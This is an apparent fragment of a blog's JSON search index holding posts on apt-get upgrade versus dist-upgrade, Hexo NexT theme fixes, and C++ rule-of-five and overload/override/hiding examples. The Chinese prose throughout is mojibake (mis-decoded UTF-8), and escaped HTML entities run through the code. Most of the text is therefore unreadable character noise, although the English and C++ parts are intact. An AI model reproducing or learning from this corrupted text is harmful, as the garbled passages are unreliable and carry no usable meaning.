·åšå¯ä»¥æœ€å¤§é™åº¦åœ°ç¡®ä¿æ–°å®‰è£…çš„è½¯ä»¶åŒ…æ­£å¸¸å·¥ä½œã€‚\nPSï¼šè½¯ä»¶æºæœåŠ¡å™¨åœ°å€å¯ä»¥åœ¨/etc/apt/sources.listé‡Œé¢çœ‹åˆ°ã€‚\nExample: upgrade and dist-upgrade\napt-get upgrade å’Œ apt-get dist-upgrade æœ¬è´¨ä¸Šæ˜¯æ²¡æœ‰ä»€ä¹ˆä¸åŒçš„ã€‚åªä¸è¿‡ï¼Œdist-upgrade ä¼šè¯†åˆ«å‡ºå½“ä¾èµ–å…³ç³»æ”¹å˜çš„æƒ…å½¢å¹¶ä½œå‡ºå¤„ç†ï¼Œè€Œupgradeå¯¹æ­¤æƒ…å½¢ä¸å¤„ç†ã€‚\nä¾‹å¦‚è½¯ä»¶åŒ… a åŸå…ˆä¾èµ– b c dï¼Œä½†æ˜¯åœ¨æºé‡Œé¢å¯èƒ½å·²ç»å‡çº§äº†ï¼Œç°åœ¨æ˜¯ a ä¾èµ– b c eã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œdist-upgrade ä¼šåˆ é™¤ d å®‰è£… eï¼Œå¹¶æŠŠ a è½¯ä»¶åŒ…å‡çº§ï¼Œè€Œ upgrade ä¼šè®¤ä¸ºä¾èµ–å…³ç³»æ”¹å˜è€Œæ‹’ç»å‡çº§ a è½¯ä»¶åŒ…ã€‚\n","date":1536505771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536505771,"objectID":"41fbd518e333f6e483c020d47f97ae07","permalink":"http://www.guozet.me/post/Ubuntu-Update-Upgrade/","publishdate":"2018-09-09T15:09:31Z","relpermalink":"/post/Ubuntu-Update-Upgrade/","section":"post","summary":"Introduce å¸¸ç”¨çš„ä¸‰ä¸ªå‘½ä»¤ï¼š\nsudo apt-get update sudo apt-get upgrade sudo apt-get dist-upgrade apt-getæ˜¯æŸäº›linuxå‘è¡Œç‰ˆä½¿ç”¨çš„ä¸€ä¸ªâ€œåŒ…ç®¡ç†å™¨â€ï¼ˆè¿˜æœ‰åˆ«çš„å‘è¡Œç‰ˆä½¿ç”¨yumç­‰ï¼Œä»¥åŠbrewç­‰å…¶ä»–å¹³å°ä¸Šçš„åŒ…ç®¡ç†å™¨ï¼Œå·¥ä½œåŸç†ç±»ä¼¼ï¼‰ã€‚åŒ…ç®¡ç†å™¨çš„ä½œç”¨æ˜¯ä»æºï¼ˆSourceï¼‰æœåŠ¡å™¨é‚£é‡Œä¸‹è½½æœ€æ–°çš„è½¯ä»¶åŒ…åˆ—è¡¨ï¼Œç„¶ååœ¨ä½ éœ€è¦å®‰è£…æŸä¸ªè½¯ä»¶åŒ…ï¼ˆapt-get installï¼‰çš„æ—¶å€™ä»åˆ—è¡¨é‡Œé¢æŸ¥è¯¢è¿™ä¸ªè½¯ä»¶åŒ…çš„ç‰ˆæœ¬ä¿¡æ¯ã€ç³»ç»Ÿè¦æ±‚ã€ç¿»è¯‘ã€ä¾èµ–é¡¹ï¼ˆè¯¥è½¯ä»¶æ­£å¸¸è¿è¡Œå¿…é¡»å®‰è£…çš„å…¶å®ƒè½¯ä»¶ï¼‰å¹¶ä¸”æ·»åŠ åˆ°åŒæ—¶å®‰è£…çš„åˆ—è¡¨é‡Œé¢ï¼Œå†æŸ¥è¯¢æ‰€æœ‰å®‰è£…åˆ—è¡¨é‡Œé¢çš„è½¯ä»¶åŒ…çš„.debæ–‡ä»¶ä¸‹è½½åœ°å€ï¼Œæœ€åæ‰¹é‡ä¸‹è½½ï¼Œè‡ªåŠ¨åˆ†æå®‰è£…é¡ºåºç„¶åå®‰è£…å®Œæˆã€‚\n","tags":"Linux","title":"Ubuntué‡Œé¢update,upgradeå’Œdist-upgradeçš„åŒºåˆ«","type":"post"},{"authors":null,"categories":"Hexo","content":"å‰è¨€ è®°å½•å¯¹Hexoçš„ä¼˜åŒ–ï¼Œä»¥åŠé…ç½®Hexoä¸­é‡åˆ°çš„é—®é¢˜ä»¥åŠè§£å†³æ–¹æ¡ˆã€‚\né—®é¢˜ æœ¬åœ°æœç´¢è·¯å¾„ä¸æ­£ç¡® é—®é¢˜æè¿° æœŸå¾…è·¯å¾„æ˜¯http://guozet.me/post/postname/,ç„¶åå®é™…å¾—åˆ°çš„è·¯å¾„æ˜¯/post/postname/ã€‚ å…ˆæ£€æŸ¥è‡ªå·±çš„ é…ç½®è¿‡ç¨‹ï¼š\n$ npm install hexo-generator-search --save ç«™ç‚¹é…ç½®æ–‡ä»¶ï¼š_config.ymlä¸­ä»»æ„ä½ç½®åŠ å…¥ï¼š\nsearch: path: search.xml field: post æˆ‘æœ¬åœ°çš„é…ç½®ä¸ä¸Šé¢çš„é…ç½®æ˜¯ä¸€è‡´çš„ï¼Œä½†æ˜¯è·¯å¾„ä½ç½®å°±æ˜¯ä¸å¯¹ï¼Œç»è¿‡æœç´¢ï¼Œåœ¨è¿™ä¸ª é“¾æ¥è§£å†³äº†æˆ‘çš„é—®é¢˜ã€‚\nè§£å†³æ€è·¯ åœ¨æœç´¢é¡µé¢ï¼Œä½¿ç”¨F12æ‰“å¼€ç¡®å®šè‡ªå·±çš„æœç´¢è·¯å¾„é“¾æ¥æ˜¯å¦æœ‰é—®é¢˜ã€‚ å‘ç°åœ¨è·¯å¾„ä½ç½®ï¼š\n\u0026lt;a href=\u0026quot;//post/Write-first-Analyzer-rip/\u0026quot; class=\u0026quot;search-result-title\u0026quot;\u0026gt;åœ¨\u0026lt;b class=\u0026quot;search-keyword\u0026quot;\u0026gt;Bro\u0026lt;/b\u0026gt;ä¸­å®Œæˆç¬¬ä¸€ä¸ªåè®®åˆ†æå™¨â€”RIPåè®®\u0026lt;/a\u0026gt; è¿™é‡Œæœ‰ä¸¤ä¸ª//åœ¨postå‰é¢ï¼Œç›´æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå»æ‰ä¸€ä¸ª/ã€‚ ä¿®æ”¹localsearch.swigæºç :\n//var articleUrl = decodeURIComponent(data.url); var articleUrl = decodeURIComponent(data.url).substring(1);//æˆªå–ç¬¬ä¸€ä½/æ–œæ  ä¿®æ”¹é¡µé¢å®½åº¦ æˆ‘ä»¬ç”¨Nextä¸»é¢˜æ˜¯å‘ç°åœ¨ç”µè„‘ä¸Šé˜…è¯»æ–‡ç« æ—¶å†…å®¹ä¸¤è¾¹ç•™çš„ç©ºç™½è¾ƒå¤šï¼Œè¿™æ ·åœ¨æµè§ˆä»£ç å—æ—¶ç»å¸¸è¦æ»šåŠ¨æ»šåŠ¨æ¡æ‰èƒ½é˜…è¯»å®Œæ•´ï¼Œä½“éªŒä¸æ˜¯å¾ˆå¥½ï¼Œä¸‹é¢æä¾›ä¿®æ”¹å†…å®¹åŒºåŸŸçš„å®½åº¦çš„æ–¹æ³•ã€‚ NexT å¯¹äºå†…å®¹çš„å®½åº¦çš„è®¾å®šå¦‚ä¸‹ï¼š\n700pxï¼Œå½“å±å¹•å®½åº¦ \u0026lt; 1600px 900pxï¼Œå½“å±å¹•å®½åº¦ \u0026gt;= 1600px ç§»åŠ¨è®¾å¤‡ä¸‹ï¼Œå®½åº¦è‡ªé€‚åº” å¦‚æœä½ éœ€è¦ä¿®æ”¹å†…å®¹çš„å®½åº¦ï¼ŒåŒæ ·éœ€è¦ç¼–è¾‘æ ·å¼æ–‡ä»¶ã€‚ åœ¨Mistå’ŒMuseé£æ ¼å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³•ï¼š\nç¼–è¾‘ä¸»é¢˜çš„ source/css/_variables/custom.styl æ–‡ä»¶ï¼Œæ–°å¢å˜é‡ï¼š\n// ä¿®æ”¹æˆä½ æœŸæœ›çš„å®½åº¦ $content-desktop = 700px // å½“è§†çª—è¶…è¿‡ 1600px åçš„å®½åº¦ $content-desktop-large = 900px ","date":1536372571,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536372571,"objectID":"d3ba9c437f577671a047ee45ab4b1e5e","permalink":"http://www.guozet.me/post/Hexo-Optimize-and-patch/","publishdate":"2018-09-08T02:09:31Z","relpermalink":"/post/Hexo-Optimize-and-patch/","section":"post","summary":"å‰è¨€ è®°å½•å¯¹Hexoçš„ä¼˜åŒ–ï¼Œä»¥åŠé…ç½®Hexoä¸­é‡åˆ°çš„é—®é¢˜ä»¥åŠè§£å†³æ–¹æ¡ˆã€‚\n","tags":"Hexo","title":"Hexoä½¿ç”¨ä¸­çš„ä¼˜åŒ–ä»¥åŠé—®é¢˜è§£å†³è®°å½•","type":"post"},{"authors":null,"categories":"C++","content":"Rule of five Because the presence of a user-defined destructor, copy-constructor, or copy-assignment operator prevents implicit definition of the move constructor and the move assignment operator, any class for which move semantics are desirable, has to declare all five special member functions:\nclass rule_of_five { char* cstring; // raw pointer used as a handle to a dynamically-allocated memory block rule_of_five(const char* s, [std::size_t](http://en.cppreference.com/w/cpp/types/size_t) n) // to avoid counting twice : cstring(new char[n]) // allocate { [std::memcpy](http://en.cppreference.com/w/cpp/string/byte/memcpy)(cstring, s, n); // populate } public: rule_of_five(const char* s = \u0026quot;\u0026quot;) : rule_of_five(s, [std::strlen](http://en.cppreference.com/w/cpp/string/byte/strlen)(s) + 1) {} ~rule_of_five() { delete[] cstring; // deallocate } rule_of_five(const rule_of_five\u0026amp; other) // copy constructor : rule_of_five(other.cstring) {} rule_of_five(rule_of_five\u0026amp;\u0026amp; other) noexcept // move constructor : cstring([std::exchange](http://en.cppreference.com/w/cpp/utility/exchange)(other.cstring, nullptr)) {} rule_of_five\u0026amp; operator=(const rule_of_five\u0026amp; other) // copy assignment { return *this = rule_of_five(other); } rule_of_five\u0026amp; operator=(rule_of_five\u0026amp;\u0026amp; other) noexcept // move assignment { [std::swap](http://en.cppreference.com/w/cpp/algorithm/swap)(cstring, other.cstring); return *this; } // alternatively, replace both assignment operators with // rule_of_five\u0026amp; operator=(rule_of_five other) noexcept // { // std::swap(cstring, other.cstring); // return *this; // } }; Unlike Rule of Three, failing to provide move constructor and move assignment is usually not an error, but a missed optimization opportunity.\nç¬¬äº”æ¡ï¼šå†è°ˆé‡è½½ã€è¦†ç›–å’Œéšè—\nåœ¨C++ä¸­ï¼Œæ— è®ºåœ¨ç±»ä½œç”¨åŸŸå†…è¿˜æ˜¯å¤–ï¼Œä¸¤ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰åŒåçš„å‡½æ•°ï¼Œå¯èƒ½ä¸”ä»…å¯èƒ½æ˜¯ä»¥ä¸‹ä¸‰ç§å…³ç³»ï¼šé‡è½½ï¼ˆOverloadï¼‰ã€è¦†ç›–ï¼ˆOverrideï¼‰å’Œéšè—ï¼ˆHideï¼‰ï¼Œå› ä¸ºåŒåï¼ŒåŒºåˆ†è¿™äº›å…³ç³»åˆ™æ˜¯æ ¹æ®å‚æ•°æ˜¯å¦ç›¸åŒã€æ˜¯å¦å¸¦æœ‰constæˆå‘˜å‡½æ•°æ€§è´¨ã€æ˜¯å¦æœ‰virtualå…³é”®å­—ä¿®é¥°ä»¥åŠæ˜¯å¦åœ¨åŒä¸€ä½œç”¨åŸŸæ¥åˆ¤æ–­ã€‚åœ¨ç¬¬å››æ¡ä¸­ï¼Œæˆ‘ä»¬æ›¾æåˆ°äº†ä¸€äº›å…³äºé‡è½½ã€è¦†ç›–çš„æ¦‚å¿µï¼Œä½†åªæ˜¯ä¸€å¸¦è€Œè¿‡ï¼Œä¹Ÿæ²¡æœ‰æåˆ°éšè—ï¼Œè¿™ä¸€ç¯‡æˆ‘ä»¬å°†è¯¦ç»†è®¨è®ºã€‚\n1ã€é¦–å…ˆè¯´çš„æ˜¯é‡è½½ï¼Œæœ‰ä¸€ä¸ªå‰æå¿…é¡»è¦å¼„æ¸…æ¥šçš„æ˜¯ï¼Œå¦‚æœä¸åœ¨ç±»ä½œç”¨åŸŸå†…è¿›è¡Œè®¨è®ºï¼Œä¸¤ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰åŒåå‡½æ•°ä¹‹é—´çš„å…³ç³»åªå¯èƒ½æ˜¯é‡è½½æˆ–éšè—ï¼Œè¿™é‡Œå…ˆè¯´é‡è½½ã€‚è€ƒè™‘ä»¥ä¸‹äº‹å®ï¼š\nint foo(char c){...} void foo(int x){...} è¿™ä¸¤ä¸ªå‡½æ•°ä¹‹é—´çš„å…³ç³»æ˜¯é‡è½½ï¼ˆoverloadï¼‰ï¼Œå³ç›¸åŒå‡½æ•°åä½†å‚æ•°ä¸åŒï¼Œå¹¶æ³¨æ„è¿”å›ç±»å‹æ˜¯å¦ç›¸åŒå¹¶ä¸ä¼šå¯¹é‡è½½äº§ç”Ÿä»»ä½•å½±å“ã€‚\nä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä»…ä»…æ˜¯è¿”å›ç±»å‹ä¸ç›¸åŒï¼Œè€Œå‡½æ•°åå’Œå‚æ•°éƒ½å®Œå…¨ç›¸åŒçš„ä¸¤ä¸ªå‡½æ•°ï¼Œä¸èƒ½æ„æˆé‡è½½ï¼Œç¼–è¯‘å™¨ä¼šå‘ŠçŸ¥\u0026quot;ambiguous\u0026quot;ï¼ˆäºŒä¹‰æ€§ï¼‰ç­‰è¯ä»¥è¡¨è¾¾å…¶ä¸æ»¡ï¼š\n//Can't be compiled! int fooo(char c){...} void fooo(char c){...} char c = 'A'; fooo(c); // Which one? ambiguous åœ¨ç¬¬å››æ¡ä¸­ï¼Œå·²ç»è®²è¿°è¿‡ï¼Œé‡è½½æ˜¯ç¼–è¯‘æœŸç»‘å®šçš„é™æ€è¡Œä¸ºï¼Œä¸æ˜¯çœŸæ­£çš„å¤šæ€æ€§ï¼Œé‚£ä¹ˆï¼Œç¼–è¯‘å™¨æ˜¯æ ¹æ®ä»€ä¹ˆæ¥è¿›è¡Œé™æ€ç»‘å®šå‘¢ï¼Ÿåˆæ˜¯å¦‚ä½•ç¡®å®šä¸¤ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰å‡½æ•°ä¹‹é—´çš„å…³ç³»æ˜¯é‡è½½å‘¢ï¼Ÿ\næœ‰ä»¥ä¸‹åˆ¤å®šä¾æ®ï¼š\nï¼ˆ1ï¼‰ç›¸åŒçš„èŒƒå›´ï¼šå³ä½œç”¨åŸŸï¼Œè¿™é‡ŒæŒ‡åœ¨åŒä¸€ä¸ªç±»ä¸­ï¼Œæˆ–åŒä¸€ä¸ªåå­—ç©ºé—´ï¼Œå³C++çš„å‡½æ•°é‡è½½ä¸æ”¯æŒè·¨è¶Šä½œç”¨åŸŸè¿›è¡Œï¼ˆè¯»è€…å¯å†æ¬¡å¯¹æ¯”Javaåœ¨è¿™é—®é¢˜ä¸Šçš„ç¥å¥‡å¤„ç†ï¼Œæ—¢ä¸Šæ¬¡Javaç»™æˆ‘ä»¬æä¾›äº†æœªåœå…ˆçŸ¥çš„åŠ¨æ€ç»‘å®šèƒ½åŠ›åï¼ŒJavaè¶…ä¸€æµçš„æ„è¯†å’Œå¤§å±€è§‚å†æ¬¡ç»™Javaç¨‹åºå‘˜æä¾›äº†è·¨ç±»é‡è½½çš„èƒ½åŠ›ï¼Œå¦‚æœ‰å…´è¶£å¯è¯¦ç»†é˜…è¯»ã€ŠThinking in Javaã€‹çš„ç›¸å…³ç« èŠ‚ï¼Œå…¶å®å¯¹äºå­¦å¥½C++æ¥è®²ï¼Œå»å­¦ä¸€ä¸‹Javaæ˜¯å¾ˆæœ‰å¸®åŠ©çš„ï¼Œå®ƒä¼šå‘Šè¯‰ä½ ï¼ŒåŒæ ·æˆ–ç±»ä¼¼çš„é—®é¢˜ï¼Œä¸ºä»€ä¹ˆJavaè¦åšè¿™æ ·çš„æ”¹è¿›ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯åŒºåˆ«é‡è½½å’Œéšè—çš„æœ€é‡è¦ä¾æ®ã€‚\nå…³äºâ€œC++ä¸èƒ½æ”¯æŒè·¨ç±»é‡è½½â€ï¼Œç¨åç¬”è€…ä¼šç»™å‡ºä»£ç æ¥ä¾‹è¯è¿™ä¸€ç‚¹ã€‚\nï¼ˆ2ï¼‰å‡½æ•°åå­—ç›¸åŒï¼ˆåŸºæœ¬å‰æï¼‰\nï¼ˆ3ï¼‰å‡½æ•°å‚æ•°ä¸åŒï¼ˆåŸºæœ¬å‰æï¼Œå¦åˆ™åœ¨åŒä¸€ä½œç”¨åŸŸå†…æœ‰ä¸¤ä¸ªæˆ–å¤šä¸ªåŒååŒå‚æ•°çš„å‡½æ•°ï¼Œå°†äº§ç”Ÿambiguousï¼Œå¦å¤–æ³¨æ„ï¼Œå¯¹äºæˆå‘˜å‡½æ•°ï¼Œæ˜¯å¦æ˜¯constæˆå‘˜å‡½æ•°ï¼Œå³å‡½æ•°å£°æ˜ä¹‹åæ˜¯å¦å¸¦æœ‰constæ ‡å¿—ï¼Œ å¯ç†è§£ä¸ºâ€œå‚æ•°ä¸åŒâ€œï¼‰ï¼Œç¬¬ï¼ˆ2ï¼‰å’Œç¬¬ï¼ˆ3ï¼‰ç‚¹ç»Ÿç§°â€œå‡½æ•°ç‰¹å¾æ ‡â€ä¸åŒ\nï¼ˆ4ï¼‰virtualå…³é”®å­—å¯æœ‰å¯æ— ä¸äº§ç”Ÿå½±å“ï¼ˆå› ä¸ºç¬¬ï¼ˆ1ï¼‰ç‚¹å·²ç»æŒ‡å‡ºï¼Œè¿™æ˜¯åœ¨åŒä¸€ä¸ªç±»ä¸­ï¼‰\nå³**â€œç›¸åŒçš„èŒƒå›´ï¼Œç‰¹å¾æ ‡ä¸åŒï¼ˆå½“ç„¶åŒåæ˜¯è‚¯å®šçš„ï¼‰ï¼Œå‘ç”Ÿé‡è½½â€œ**ã€‚\n2ã€è¦†ç›–ï¼ˆoverrideï¼‰ï¼ŒçœŸæ­£çš„å¤šæ€è¡Œä¸ºï¼Œé€šè¿‡è™šå‡½æ•°æ¥å®ç°ï¼Œæ‰€ä»¥ï¼Œç¼–è¯‘å™¨æ ¹æ®ä»¥ä¸‹ä¾æ®æ¥è¿›è¡Œåˆ¤å®šä¸¤ä¸ªï¼ˆæ³¨æ„åªå¯èƒ½æ˜¯ä¸¤ä¸ªï¼Œå³ä½¿åœ¨ç»§æ‰¿é“¾ä¸­ï¼Œä¹Ÿåªæ˜¯æœ€è¿‘ä¸¤ä¸ªä¸ºä¸€ç»„ï¼‰å‡½æ•°ä¹‹é—´çš„å…³ç³»æ˜¯è¦†ç›–ï¼š\nï¼ˆ1ï¼‰ä¸åŒçš„èŒƒå›´ï¼šå³ä½¿ç”¨åŸŸï¼Œä¸¤ä¸ªå‡½æ•°åˆ†åˆ«ä½äºåŸºç±»å’Œæ´¾ç”Ÿç±»ä¸­\nï¼ˆ2ï¼‰å‡½æ•°åå­—ç›¸åŒï¼ˆåŸºæœ¬å‰æï¼‰\nï¼ˆ3ï¼‰å‡½æ•°å‚æ•°ä¹Ÿç›¸åŒï¼ˆåŸºæœ¬å‰æï¼‰ï¼Œç¬¬ï¼ˆ2ï¼‰å’Œç¬¬ï¼ˆ3ï¼‰ç‚¹ç»Ÿç§°â€œå‡½æ•°ç‰¹å¾æ ‡â€ç›¸åŒ\nï¼ˆ4ï¼‰åŸºç±»å‡½æ•°å¿…é¡»ç”¨virtualå…³é”®å­—ä¿®é¥°\nå³**â€œä¸åŒçš„èŒƒå›´ï¼Œç‰¹å¾æ ‡ç›¸åŒï¼Œä¸”åŸºç±»æœ‰virtualå£°æ˜ï¼Œå‘ç”Ÿè¦†ç›–â€œ**ã€‚\n3ã€éšè—ï¼ˆHideï¼‰ï¼Œå³ï¼š\nï¼ˆ1ï¼‰å¦‚æœæ´¾ç”Ÿç±»å‡½æ•°ä¸åŸºç±»å‡½æ•°åŒåï¼Œä½†å‚æ•°ä¸åŒï¼ˆç‰¹å¾æ ‡ä¸åŒï¼‰ï¼Œæ­¤æ—¶ï¼Œæ— è®ºæ˜¯å¦æœ‰virtualå…³é”®å­—ï¼ŒåŸºç±»çš„æ‰€æœ‰åŒåå‡½æ•°éƒ½å°†è¢«éšè—ï¼Œè€Œä¸ä¼šé‡è½½ï¼Œå› ä¸ºä¸åœ¨åŒä¸€ä¸ªç±»ä¸­ï¼›\nï¼ˆ2ï¼‰å¦‚æœæ´¾ç”Ÿç±»å‡½æ•°ä¸åŸºç±»å‡½æ•°åŒåï¼Œä¸”å‚æ•°ä¹Ÿç›¸åŒï¼ˆç‰¹å¾æ ‡ç›¸åŒï¼‰ï¼Œä½†åŸºç±»å‡½æ•°æ²¡æœ‰ç”¨virtualå…³é”®å­—å£°æ˜ï¼Œåˆ™åŸºç±»çš„æ‰€æœ‰åŒåå‡½æ•°éƒ½å°†è¢«éšè—ï¼Œè€Œä¸ä¼šè¦†ç›–ï¼Œå› ä¸ºæ²¡æœ‰å£°æ˜ä¸ºè™šå‡½æ•°ã€‚\nå³**â€œä¸åŒçš„èŒƒå›´ï¼Œç‰¹å¾æ ‡ä¸åŒï¼ˆå½“ç„¶åŒåæ˜¯è‚¯å®šçš„ï¼‰ï¼Œå‘ç”Ÿéšè—â€ï¼Œæˆ–\u0026ldquo;ä¸åŒçš„èŒƒå›´ï¼Œç‰¹å¾æ ‡ç›¸åŒï¼Œä½†åŸºç±»æ²¡æœ‰virtualå£°æ˜ï¼Œå‘ç”Ÿéšè—â€œ**ã€‚\nå¯è§æœ‰ä¸¤ç§äº§ç”Ÿéšè—çš„æƒ…å†µï¼Œåˆ†åˆ«å¯¹åº”ä¸èƒ½æ»¡è¶³é‡è½½å’Œè¦†ç›–æ¡ä»¶çš„æƒ…å†µã€‚\nå¦å¤–å¿…é¡»è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ç±»å¤–è®¨è®ºæ—¶ï¼Œä¹Ÿå¯èƒ½å‘ç”Ÿéšè—ï¼Œå¦‚åœ¨åå­—ç©ºé—´ä¸­ï¼Œå¦‚ä¸‹è¿°ä»£ç æ‰€ç¤ºï¼š\n#include \u0026lt;iostream\u0026gt; using namespace std; void foo(void) { cout \u0026lt;\u0026lt; \u0026quot;global foo()\u0026quot; \u0026lt;\u0026lt; endl; } int foo(int x) { cout \u0026lt;\u0026lt; \u0026quot;global foo(int)\u0026quot; \u0026lt;\u0026lt; endl; return x; } namespace a { void foo(void) { cout \u0026lt;\u0026lt; \u0026quot;a::foo()\u0026quot; \u0026lt;\u0026lt; endl; } void callFoo(void) { foo(); // foo(10); Can't be compiled! } } int main(int argc, char** argv) { foo(); a::callFoo(); return 0; } è¾“å‡ºç»“æœï¼š\nglobal foo() a::foo() æ³¨æ„ï¼Œåå­—ç©ºé—´aä¸­çš„fooéšè—äº†å…¶å®ƒä½œç”¨åŸŸï¼ˆè¿™é‡Œæ˜¯å…¨å±€ä½œç”¨åŸŸï¼‰ä¸­çš„æ‰€æœ‰fooåç§°ï¼Œfoo(10)ä¸èƒ½é€šè¿‡ç¼–è¯‘ï¼Œå› ä¸ºå…¨å±€ä½œç”¨åŸŸä¸­çš„int foo(int)ç‰ˆæœ¬ä¹Ÿå·²ç»è¢«a::foo()éšè—äº†ï¼Œé™¤éä½¿ç”¨::foo(10)æ˜¾å¼è¿›è¡Œè°ƒç”¨ã€‚\nè¿™ä¹Ÿå‘Šè¯‰æˆ‘ä»¬ï¼Œæ— è®ºä½•æ—¶ï¼Œéƒ½ä½¿ç”¨å®Œæ•´åç§°ä¿®é¥°ï¼ˆä½œç”¨åŸŸè§£æç¬¦è°ƒç”¨å‡½æ•°ï¼Œæˆ–æŒ‡é’ˆã€å¯¹è±¡è°ƒç”¨æˆå‘˜å‡½æ•°ï¼‰æ˜¯ä¸€ç§å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ã€‚\nå¥½äº†ï¼Œä¸Šé¢é›¶é›¶æ•£æ•£è¯´äº†å¤ªå¤šç†è®ºçš„ä¸œè¥¿ï¼Œæˆ‘ä»¬éœ€è¦ä¸€æ®µå®é™…çš„ä»£ç ï¼Œæ¥éªŒè¯ä¸Šè¿°æ‰€æœ‰çš„ç»“è®ºï¼š\n#include \u0026lt;iostream\u0026gt; using namespace std; class Other { void* p; }; class Base { public: int iBase; Base():iBase(10){} virtual void f(int x = 20){ cout \u0026lt;\u0026lt; \u0026quot;Base::f()--\u0026quot; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; endl; } virtual void g(float f) { cout \u0026lt;\u0026lt; \u0026quot;Base::g(float)--\u0026quot; \u0026lt;\u0026lt; f \u0026lt;\u0026lt; endl; } void g(Other\u0026amp; o) { cout \u0026lt;\u0026lt; \u0026quot;Base::g(Other\u0026amp;)\u0026quot; \u0026lt;\u0026lt; endl; } void g(Other\u0026amp; o) const { cout \u0026lt;\u0026lt; \u0026quot;Base::g(Other\u0026amp;) const\u0026quot; \u0026lt;\u0026lt; endl;} }; class Derived : public Base { public: int iDerived; Derived():iDerived(100){} void f(int x = 200){ cout \u0026lt;\u0026lt; \u0026quot;Derived::f()--\u0026quot; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; endl; } virtual void g(int x) { cout \u0026lt;\u0026lt; \u0026quot;Derived::g(int)--\u0026quot; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; endl; } }; int main(int argc, char** argv) { Base* pBase = NULL; Derived* pDerived = NULL; Base b; Derived d; pBase = \u0026amp;b; pDerived = \u0026amp;d; Base* pBD = \u0026amp;d; const Base* pC = \u0026amp;d; const Base* const pCCP = \u0026amp;d; Base* const pCP = \u0026amp;d; int x = 5; Other o; float f = 3.1415926; b.f(); pBase-\u0026gt;f(); d.f(); pDerived-\u0026gt;f(); pBD-\u0026gt;f(); b.g(x); b.g(o); d.g(x); d.g(f); // Can't be compiled! // d.g(o); pBD-\u0026gt;g(x); pBD-\u0026gt;g(f); pC-\u0026gt;g(o); pCCP-\u0026gt;g(o); pCP-\u0026gt;g(o); return 0; } åœ¨ç¬”è€…Ubuntu 12.04 + gcc 4.6.3è¿è¡Œç»“æœï¼š\nBase::f()--20 //b.f()ï¼Œé€šè¿‡å¯¹è±¡è°ƒç”¨ï¼Œæ— è™šç‰¹æ€§ï¼Œé™æ€ç»‘å®š Base::f()--20 //åŸºç±»æŒ‡é’ˆæŒ‡å‘åŸºç±»å¯¹è±¡ï¼Œè™½ç„¶æ˜¯åŠ¨æ€ç»‘å®šï¼Œä½†æ²¡æœ‰ä½¿ç”¨åˆ°è¦†ç›– Derived::f()--200 //d.fï¼Œé€šè¿‡å¯¹è±¡è°ƒç”¨ï¼Œæ— è™šç‰¹æ€§ï¼Œé™æ€ç»‘å®š Derived::f()--200 //å­ç±»æŒ‡é’ˆæŒ‡å‘å­ç±»å¯¹è±¡ï¼Œè™½ç„¶æ˜¯åŠ¨æ€ç»‘å®šï¼Œä½†æ²¡æœ‰ä½¿ç”¨åˆ°è¦†ç›– Derived::f()--20 //åŸºç±»æŒ‡é’ˆæŒ‡å‘å­ç±»å¯¹è±¡ï¼ŒåŠ¨æ€ç»‘å®šï¼Œå­ç±»f()è¦†ç›–åŸºç±»ç‰ˆæœ¬ã€‚ä½†å‡½æ•°å‚æ•°é»˜è®¤å€¼ï¼Œæ˜¯é™æ€è”ç¼–è¡Œä¸ºï¼ŒpBDçš„ç±»å‹æ˜¯åŸºç±»æŒ‡é’ˆï¼Œæ‰€ä»¥ä½¿ç”¨äº†åŸºç±»çš„å‚æ•°é»˜è®¤å€¼ï¼Œæ³¨æ„æ­¤å¤„ï¼ Base::g(float)--5 //é€šè¿‡å¯¹è±¡è°ƒç”¨ï¼Œintè¢«æå‡ä¸ºfloat Base::g(Other\u0026amp;) //æ²¡ä»€ä¹ˆé—®é¢˜ï¼ŒåŸºç±»ä¸­ä¸‰ä¸ªgå‡½æ•°ä¹‹é—´çš„å…³ç³»æ˜¯é‡è½½ Derived::g(int)--5 //æ²¡ä»€ä¹ˆé—®é¢˜ Derived::g(int)--3 //æ³¨æ„åŸºç±»çš„g(float)å·²ç»è¢«éšè—ï¼æ‰€ä»¥ä¼ å…¥çš„floatå‚æ•°è°ƒç”¨çš„å´æ˜¯å­ç±»çš„g(int)æ–¹æ³•ï¼ Base::g(float)--5 //æ³¨æ„ï¼pBDæ˜¯åŸºç±»æŒ‡é’ˆï¼Œè™½ç„¶å®ƒæŒ‡å‘äº†å­ç±»å¯¹è±¡ï¼Œä½†åŸºç±»ä¸­çš„æ‰€æœ‰gå‡½æ•°ç‰ˆæœ¬å®ƒæ˜¯å¯è§çš„ï¼æ‰€ä»¥pBD-\u0026gt;g(5)è°ƒç”¨åˆ°äº†g(float)ï¼è™½ç„¶äº§ç”Ÿäº†åŠ¨æ€è”ç¼–ä¹Ÿå‘ç”Ÿäº†éšè—ï¼Œä½†å­ç±»å¯¹è±¡çš„è™šè¡¨ä¸­ï¼Œä»å¯ä»¥æ‰¾åˆ°g(float)çš„åœ°å€ï¼Œå³åŸºç±»ç‰ˆæœ¬ï¼ Base::g(float)--3.14159 //åŸç†åŒä¸Š //d.g(o) //æ³¨æ„æ­¤å¤„ï¼å†æ³¨æ„ä»£ç ä¸­è¢«æ³¨é‡Šäº†çš„ä¸€è¡Œï¼Œd.g(o)ä¸èƒ½é€šè¿‡ç¼–è¯‘ï¼Œå› ä¸ºdæ˜¯å­ç±»å¯¹è±¡ï¼Œåœ¨å­ç±»ä¸­ï¼ŒåŸºç±»ä¸­å®šä¹‰çš„ä¸‰ä¸ªgå‡½æ•°ç‰ˆæœ¬éƒ½è¢«éšè—äº†ï¼Œç¼–è¯‘æ—¶ä¸å¯è§ï¼ä¸ä¼šé‡è½½ Base::g(Other\u0026amp;) const 